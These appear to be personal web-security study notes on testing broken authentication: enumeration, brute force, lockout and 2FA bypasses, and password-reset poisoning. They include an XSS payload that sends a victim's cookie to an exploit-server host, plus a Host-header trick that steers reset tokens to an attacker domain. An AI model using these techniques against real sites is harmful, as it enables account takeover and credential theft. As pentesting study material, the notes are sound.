# Possible flows of broken Auth cases 

## Username enumeration and brute-force
- submit several bad login attempts for an account u control 
- After 10 failed login attempts, if the application does not return a message about account lockout, attempt to log in correctly. If it works, then there is no lockout mechanism.
	- run brute force attack
		- submit a request with a valid username and valid password.
		- submit a request with a valid username and invalid password.
		- submit a request with an invalid username
		- check for diff between responses (u can use comparer in burp)
			- status code
			- any redirects 
				- 302 when password is correct
			- info displayed on screen 
				- wrong password when username is correct
			- HTML page source
			- time to process the request
				- ![[Pasted image 20230908165356.png]]
				- if the username is correct => long time process 
- if the account is locked, try to bypass the lock mechanism 
	- `X-Forwarded-For: randomIp` => change the ip where the requests is sent from
	- if the lock happens after 4 fails attempts e.g, try to do a successful login in the 4th request, then do 3 brute force requests, etc .. 
- sometimes u will only get locked if the user u trying to bruteforce his password exists, hence, u can enumerate usernames
	- once u got the right username, brute force his password
## 2FA Vulns
- login with an account u have a control on, enter the 2FA code, check the home page path
- if u enter the victim's user and password, then a 2FA code is required, try to just go to the home page without entering the 2FA code, because the website may not check whether u enterd the 2FA code or not
- in the below case, if there is a cookie used to determine which account will be logged into, u can brute force the victim 2FA code if there is no brute force protection mechanism
```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456
```
## Keeping users logged in Auth
- ![[Pasted image 20230908201343.png]]
	- crack the MD5 hash, make use of payload processing in burp
- it's possible to obtain the victim's cookie via xss vuln
`<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`


## Resetting passwords using a URL -  Password reset poisoning
- u can specify which user u will reset his password because the token is not validated based on specific user
	- ![[Pasted image 20230908210731.png]]
	- change the username to the victim username
	- This token should expire after a short period of time and be destroyed immediately after the password has been reset.
- If the URL that is sent to the user is dynamically generated based on controllable input, such as the Host header, it may be possible to construct a password reset poisoning attack
	- The attacker obtains the victim's email address or username, as required, and submits a password reset request on their behalf. When submitting the form, they intercept the resulting HTTP request and modify the** Host header or X-Forwarded-Host** so that it points to a domain that they control. For this example, we'll use `evil-user.net`.
	- The victim receives a genuine password reset email directly from the website`https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j`
	- when he click the link, u will receive the token
	- supply the victim token and change his password :)
## Password Change Functionality
- submit a valid current password and new and confirm, (valid request)
- submit a valid current password, but unmatched new and confirm  pass's
- submit an invalid current password, but matched new and confirm pass's
- submit an invalid current password, but unmatched new and confirm pass's





## Vulnerable Transmission of Credentials
- if HTTP only ? 
	- use wireshark as POC to sniff the data being submitted
## Insecure Forgot Password Functionality
- perform a complete walk-through of the forgot password functionality using an account you have control of while intercepting the requests / responses in a proxy.
- Review the functionality to determine if it allows for username enumeration or brute- force attacks
- If the application generates an email containing a recovery URL, obtain a number of these URLs and attempt to identify any predictable patterns or sensitive information included in the URL. Also check if the URL is long lived and does not expire.
## Defects in Multistage Login Mechanism
- perform a complete walk-through using an account you have control of while intercepting the requests / responses in a proxy.
- Review the functionality to determine if it allows for username enumeration or brute- force attacks.

# some hints
---
- 2FA feature => backup codes
	- try to login using backup codes, but enter invalid backup code, there might not be validation on these backup code functionality 
---
- activate 2FA, then reset ur password and check if it login to ur page direct without 2FA code

2FA Bypass techniques: ![üçÄ](https://static.xx.fbcdn.net/images/emoji.php/v9/t87/1/16/1f340.png)![üî•](https://static.xx.fbcdn.net/images/emoji.php/v9/t50/1/16/1f525.png)

1. Response Manipulation

In response if "success":false

Change it to "success":true

2. Status Code Manipulation

If Status Code is 4xx

Try to change it to 200 OK and see if it bypass restrictions

3. 2FA Code Leakage in Response

Check the response of the 2FA Code Triggering Request to see if the code is leaked.

4.JS File Analysis

Rare but some JS Files may contain info about the 2FA Code, worth giving a shot

5.2FA Code Reusability

Same code can be reused

6.Lack of Brute-Force Protection

Possible to brute-force any length 2FA Code

7.Missing 2FA Code Integrity Validation

Code for any user account can be used to bypass the 2FA

8.CSRF on 2FA Disabling

No CSRF Protection on disabling 2FA, also there is no auth confirmation

9. Password Reset Disable 2FA

2FA gets disabled on password change/email change

10.Backup Code Abuse

Bypassing 2FA by abusing the Backup code feature

Use the above mentioned techniques to bypass Backup Code to remove/reset 2FA reset restrictions

11.Clickjacking on 2FA Disabling Page

Iframing the 2FA Disabling page and social engineering victim to disable the 2FA

12.Iframing the 2FA Disabling page and social engineering victim to disable the 2FA

If the session is already hijacked and there is a session timeout vulnerbility

13.Bypass 2FA with null or 000000

Enter the code 000000 or null to bypass 2FA protection.

Steps:-

1. Enter ‚Äúnull‚Äù in 2FA code

2. Enter 000000 in 2FA code

3. Send empty code - Someone found this in grammarly

4. Open new tab in same browser and check if other API endpoints are accessible without entering 2FA

14. Google Authenticator Bypass

Steps:-

1) Set-up Google Authenticator for 2FA

2) Now, 2FA is enabled

3) Go on password reset page and change your password

4) If you are website redirect you to your dashboard then 2FA (Google Authenticator) is bypassed

15. Bypassing OTP in registration forms by repeating the form submission multiple times using repeater

Steps :-

1) Create an account with a non-existing phone number

2) Intercept the Request in BurpSuite

3) Send the request to the repeater and forward

4) Go to Repeater tab and change the non-existent phone number to your phone number

5) If you got an OTP to your phone, try using that OTP to register that non-existent number
